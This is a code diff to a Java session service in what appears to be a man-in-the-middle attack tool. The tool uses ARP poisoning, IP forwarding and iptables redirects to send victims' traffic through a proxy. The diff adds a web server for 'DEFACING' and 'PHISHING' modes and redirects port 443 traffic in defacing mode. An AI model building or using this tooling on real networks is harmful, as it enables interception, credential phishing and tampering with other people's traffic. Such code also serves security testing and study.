@@ -1,6 +1,7 @@
 package io.gl4dius.cli.service.session;
 
 import io.gl4dius.cli.Gl4diusApplication;
+import io.gl4dius.cli.assets.InterceptionMode;
 import io.gl4dius.cli.assets.PreferencesKey;
 import io.gl4dius.cli.exception.GatewayDetectionException;
 import io.gl4dius.cli.model.dto.iptables.IptablesRedirectRule;
@@ -13,6 +14,7 @@ import io.gl4dius.cli.repository.SessionRepository;
 import io.gl4dius.cli.service.DaemonModuleExecutor;
 import io.gl4dius.cli.service.NetDiscoveryService;
 import io.gl4dius.cli.service.proxy.ProxyServerEngine;
+import io.gl4dius.cli.service.webserver.WebServerEngine;
 import io.gl4dius.cli.utility.NetInterfaceUtil;
 import io.gl4dius.cli.utility.UuidUtil;
 import lombok.RequiredArgsConstructor;
@@ -35,6 +37,7 @@ public class SessionExecutionService {
     private final ArpPoisoner arpPoisoner;
     private final PreferencesRepository preferencesRepository;
     private final ProxyServerEngine proxyServerEngine;
+    private final WebServerEngine webServerEngine;
     private final NetDiscoveryService netDiscoveryService;
 
     public void switchSession(String identifier) {
@@ -72,12 +75,20 @@ public class SessionExecutionService {
         }
         sessionConfig.validate();
 
+        var nic = NetInterfaceUtil.findInterface(nicName);
+        var interfaceIP = NetInterfaceUtil.resolveIp4(nic);
+
         var proxyPort = this.preferencesRepository.findById(PreferencesKey.PROXY_SERVER_PORT)
                 .orElseThrow(() -> new IllegalArgumentException("Proxy server port has not been set"))
                 .getValue();
-        var nic = NetInterfaceUtil.findInterface(nicName);
-        var interfaceIP = NetInterfaceUtil.resolveIp4(nic);
         this.proxyServerEngine.start(interfaceIP.getHostAddress(), Integer.parseInt(proxyPort));
+
+        if (sessionConfig.mode() == InterceptionMode.DEFACING || sessionConfig.mode() == InterceptionMode.PHISHING) {
+            var webServerPort = this.preferencesRepository.findById(PreferencesKey.WEB_SERVER_PORT)
+                    .orElseThrow(() -> new IllegalArgumentException("WebServer server port has not been set"))
+                    .getValue();
+            this.webServerEngine.start(interfaceIP.getHostAddress(), Integer.parseInt(webServerPort));
+        }
 
         this.ipv4ForwardingManager.enableIpv4Forwarding();
         this.iptablesRuleManager.addPostRoutingRule(nicName);
@@ -89,6 +100,15 @@ public class SessionExecutionService {
                 .destinationIp(interfaceIP.getHostAddress())
                 .destinationPort(Integer.parseInt(proxyPort))
                 .build());
+
+        if (sessionConfig.mode() == InterceptionMode.DEFACING) {
+            this.iptablesRuleManager.addRedirectRule(IptablesRedirectRule.builder()
+                    .inputInterface(nicName)
+                    .originalPort(443)
+                    .destinationIp(interfaceIP.getHostAddress())
+                    .destinationPort(Integer.parseInt(proxyPort))
+                    .build());
+        }
 
         if (gatewayIp == null || gatewayIp.isBlank()) {
             gatewayIp = this.netDiscoveryService.findDefaultGateway(nicName)
@@ -119,5 +139,6 @@ public class SessionExecutionService {
         this.daemonModuleExecutor.stop(session.getId());
         this.iptablesRuleManager.flushRules();
         this.proxyServerEngine.stop();
+        this.webServerEngine.stop();
     }
 }
